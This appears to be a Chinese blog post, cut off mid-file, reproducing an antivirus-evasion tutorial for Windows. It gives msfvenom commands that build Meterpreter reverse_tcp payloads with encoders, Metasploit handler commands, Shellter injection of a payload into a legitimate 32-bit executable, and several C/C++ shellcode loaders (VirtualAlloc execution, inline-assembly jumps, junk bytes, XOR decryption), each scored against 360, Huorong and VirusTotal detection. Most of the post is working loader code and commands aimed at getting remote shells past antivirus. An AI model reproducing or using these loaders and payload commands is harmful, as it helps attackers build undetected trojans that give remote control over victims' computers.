<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271804004.png" alt="image-20220527180452891"></p>
<h3 id="venom生成dll-VT查杀率11-70"><a href="#venom生成dll-VT查杀率11-70" class="headerlink" title="venom生成dll(VT查杀率11&#x2F;70)"></a>venom生成dll(VT查杀率11&#x2F;70)</h3><p>选择windows之后，在agent中选择第1个，生成dll。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271807146.png" alt="image-20220527180740091"></p>
<p>后面的操作和上面那个差不多，然后就能看到生成了<code>notepad.dll</code>文件。</p>
<p>原po将文件拷贝到测试机上，命令行中执行<code>rundll32.exe notepad.dll,main</code>，可动静态免杀过360和火绒。msf正常上线。在virustotal.com上查杀率为11&#x2F;71。</p>
<p>本文复现时出现问题：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271815246.png" alt="image-20220527181539179"></p>
<h2 id="Shellter免杀"><a href="#Shellter免杀" class="headerlink" title="Shellter免杀"></a>Shellter免杀</h2><p>注意：</p>
<ul>
<li>shellter目前只能注入32位的可执行文件</li>
<li>shellter需要管理员权限运行</li>
</ul>
<h3 id="安装Shellter"><a href="#安装Shellter" class="headerlink" title="安装Shellter"></a>安装Shellter</h3><p>ubuntu系统中apt安装：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install shellter</span><br><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span><br></pre></td></tr></table></figure>

<p>kali中不是很好用，windows中手动下载手动下载：</p>
<p>官方下载站点<code>https://www.shellterproject.com/download/</code>，下载后解压，无需安装，cmd下可直接使用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271824223.png" alt="image-20220527182416161"></p>
<h3 id="生成payload（VT免杀率7-69"><a href="#生成payload（VT免杀率7-69" class="headerlink" title="生成payload（VT免杀率7&#x2F;69)"></a>生成payload（VT免杀率7&#x2F;69)</h3><p>需要提前准备一个PE文件作为被注入程序。用之前选的<code>putty.exe</code>来进行测试。</p>
<p>必须使用32位PE文件，下载一个32位putty.exe：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271827287.png" alt="image-20220527182755237"></p>
<p>之后程序会把<code>putty.exe</code>进行备份，因为生成的payload会自动覆盖原来的<code>putty.exe</code>。</p>
<p>但<code>putty-32.exe</code>生成报错，换了一个32位可执行文件<code>winrar.exe</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271850186.png" alt="image-20220527185054107"></p>
<p>选项<code>Enable Stealth Mode</code>，是否启用隐身模式，启用后免杀效果会变差，建议不启用。</p>
<p>还是选择<code>windows/meterpreter/reverse_tcp</code>作为payload</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271852105.png" alt="image-20220527185214043"></p>
<p>全程自动化生成，最终的生成文件会替换原来的<code>winrar.exe</code>。</p>
<p>通过对比可发现程序稍微变大了</p>
<p>在msf中使用<code>handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp</code>进行监听</p>
<p>360和火绒均可查杀（原po执行360和火绒均可免杀，msf正常上线）。</p>
<p>在virustotal.com上查杀率为12&#x2F;65，Bypass了卡巴、瑞星（原po为7&#x2F;69，卡巴、瑞星、微软三个都没bypass）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271854112.png" alt="image-20220527185452045"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271856578.png"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205271902073.png" alt="image-20220527190242985"></p>
<h2 id="C、C-加载shellcode"><a href="#C、C-加载shellcode" class="headerlink" title="C、C++加载shellcode"></a>C、C++加载shellcode</h2><p>以上很多方法都是使用msfvenom生成shellcode，然后对shellcode进行混淆、编码等各种处理，最终再使用各种语言进行编译或加载。而被用到的最多的语言就是C&#x2F;C++、C#和python。</p>
<p>C&#x2F;C++加载shellcode手工编译的方法，一般分为两种方式：</p>
<ol>
<li><p>C&#x2F;C++源码+shellcode直接编译，其中对shellcode的执行可以使用函数指针执行、汇编指令执行、申请动态内存等方式，且shellcode可进行一些加密混淆处理；比如免杀工具veil和Venom都是使用了类似的方法。</p>
</li>
<li><p>使用加载器加载C&#x2F;C++代码，如shellcode_launcher之类。</p>
</li>
</ol>
<h3 id="方法1-msf直接生成exe（VT免杀率51-69）"><a href="#方法1-msf直接生成exe（VT免杀率51-69）" class="headerlink" title="方法1 msf直接生成exe（VT免杀率51&#x2F;69）"></a>方法1 msf直接生成exe（VT免杀率51&#x2F;69）</h3><p>这是最简单的一种加载shellcode的方法，直接使用msfvenom生成c语言的shellcode，为了提高免杀效果，使用了<code>shikata_ga_nai</code>编码器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.174.128 lport=6666  -f exe -o shellcode1.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301154200.png" alt="image-20220530115440059"></p>
<p>在msf中进行监听：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">msf6 &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 &gt; set LHOST 192.168.174.128</span><br><span class="line">msf6 &gt; set LPORT 6666</span><br><span class="line">msf6 &gt; set EnableStageEncoding true</span><br></pre></td></tr></table></figure>

<p>然后执行生成的<code>shellcode1.exe</code>，msf中可正常上线：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301154538.png" alt="image-20220530115427316"></p>
<p>360和火绒均可查杀，在virustotal.com上查杀率为51&#x2F;69。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301155110.png" alt="image-20220530115531047"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301156409.png" alt="image-20220530115635342"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301157438.png" alt="image-20220530115749310"></p>
<h3 id="方法2-申请动态内存加载（VT免杀率36-69）"><a href="#方法2-申请动态内存加载（VT免杀率36-69）" class="headerlink" title="方法2 申请动态内存加载（VT免杀率36&#x2F;69）"></a>方法2 申请动态内存加载（VT免杀率36&#x2F;69）</h3><p>下面的代码会申请一段动态内存，然后加载shellcode。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//windows控制台程序不出黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 原po此处内存报错，已修改</span></span><br><span class="line">    LPVOID Memory;</span><br><span class="line"></span><br><span class="line">    Memory=VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>visual studio 2019进行编译，关闭杀软，msf中可正常上线：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301349630.png" alt="image-20220530134959565"></p>
<p>打开杀软，360和火绒均可查杀（原po火绒静态和动态都可查杀，360杀毒和卫士没有反应）。</p>
<p>virustotal.com上查杀率为36&#x2F;69（原po为24&#x2F;71）。</p>
<p>受控机没有C环境，执行时缺少<code>VCRUNTIME140D.dll</code>和<code>ucrtbased.dll</code>，需要手动安装。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301354403.png" alt="image-20220530135423356"></p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301355884.png" alt="image-20220530135541816"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301352552.png" alt="image-20220530135217482"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301400718.png" alt="image-20220530140029621"></p>
<h3 id="方法3-嵌入汇编加载（VT免杀率36-69）"><a href="#方法3-嵌入汇编加载（VT免杀率36-69）" class="headerlink" title="方法3 嵌入汇编加载（VT免杀率36&#x2F;69）"></a>方法3 嵌入汇编加载（VT免杀率36&#x2F;69）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        __asm</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在vs2019中编译执行，关闭杀软，msf中可正常上线。</p>
<p>打开杀软，火绒和360均可查杀（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>
<p>virustotal.com上查杀率为36&#x2F;69（原po为12&#x2F;71）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301413445.png" alt="image-20220530141332388"></p>
<p>火绒：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301414456.png" alt="image-20220530141410368"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301417844.png" alt="image-20220530141716720"></p>
<h3 id="方法4-强制类型转换（VT免杀率34-68）"><a href="#方法4-强制类型转换（VT免杀率34-68）" class="headerlink" title="方法4 强制类型转换（VT免杀率34&#x2F;68）"></a>方法4 强制类型转换（VT免杀率34&#x2F;68）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">   ((void(WINAPI*)(void))&amp;shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打开杀软测试，360和火绒均可查杀，但360是在上线后几分钟后才检测出来的（原po静态+动态都没问题，可正常上线）。</p>
<p>virustotal.com上查杀率为34&#x2F;68（原po为9&#x2F;70）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301425472.png" alt="image-20220530142524357"></p>
<h3 id="方法5-汇编花指令-VT免杀率37-69"><a href="#方法5-汇编花指令-VT免杀率37-69" class="headerlink" title="方法5 汇编花指令(VT免杀率37&#x2F;69)"></a>方法5 汇编花指令(VT免杀率37&#x2F;69)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        _emit <span class="number">0xFF</span>  </span><br><span class="line">        _emit <span class="number">0xE0</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打开杀软，火绒可查杀，<strong>360不可查杀</strong>（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>
<p>virustotal.com上查杀率为37&#x2F;69（原po为12&#x2F;69）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301430315.png" alt="image-20220530143025208"></p>
<h3 id="方法6-xor加密（VT免杀率21-69）"><a href="#方法6-xor加密（VT免杀率21-69）" class="headerlink" title="方法6 xor加密（VT免杀率21&#x2F;69）"></a>方法6 xor加密（VT免杀率21&#x2F;69）</h3><p>需要使用一个工具<code>https://github.com/Arno0x/ShellcodeWrapper</code>，原项目为python2，在此基础上修改了一个python3版本<a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/ShellcodeWrapper">ShellcodeWrapper</a>。</p>
<p>先用msfvenom生成一个raw格式的shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.174.128 lport=6666  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure>

<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>threekiii</code>为自己设置的key。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shellcode_encoder.py -cpp -cs -py shellcode.raw threekiii xor</span><br></pre></td></tr></table></figure>

<p>生成了三个文件，一个为C++源码，也是下面要用到的，一个为C#源码，可以使用csc.exe进行加载，还有一个py文件，可直接执行也可以编译成py-exe执行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301450337.png" alt="image-20220530145037208"></p>
<p>其中<code>encryptedShellcodeWrapper_xor.cpp</code>文件中的C++源码如下，稍作修改，删除依赖库：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author: Arno0x0x, Twitter: @Arno0x0x</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除#include &quot;stdafx.h&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Encrypted shellcode and cipher key obtained from shellcode_encoder.py</span></span><br><span class="line">    <span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;tidesec&quot;</span>;</span><br><span class="line">    <span class="type">char</span> cipherType[] = <span class="string">&quot;xor&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Char array to host the deciphered shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// XOR decoding stub using the key defined above must be the same as the encoding key</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="keyword">sizeof</span> key - <span class="number">1</span>) j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        shellcode[i] = encryptedShellcode[i] ^ key[j];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocating memory with EXECUTE writes</span></span><br><span class="line">    <span class="type">void</span> *exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copying deciphered shellcode into memory as a function</span></span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the shellcode</span></span><br><span class="line">    ((<span class="type">void</span>(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vs2019编译执行，关闭杀软，msf中可正常上线：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301453694.png" alt="image-20220530145307544"></p>
<p>打开杀软，360和火绒均可查杀，其中360结果为“具有木马特征程序”（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>
<p>virustotal.com上查杀率为21&#x2F;69（原po为15&#x2F;71）。</p>
<p>360：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301454631.png" alt="image-20220530145415574"></p>
<p>VT：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301456618.png" alt="image-20220530145657512"></p>
<h3 id="方法7-base64加密1（VT免杀率21-68）"><a href="#方法7-base64加密1（VT免杀率21-68）" class="headerlink" title="方法7 base64加密1（VT免杀率21&#x2F;68）"></a>方法7 base64加密1（VT免杀率21&#x2F;68）</h3><p>需要两个文件，<code>base64.c</code>和<code>base64.h</code></p>
<p><code>base64.c</code>文件内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Base64 encoder/decoder. Originally Apache file ap_base64.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* aaaack but it&#x27;s fast and const should make it shared text page. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> pr2six[<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ASCII table 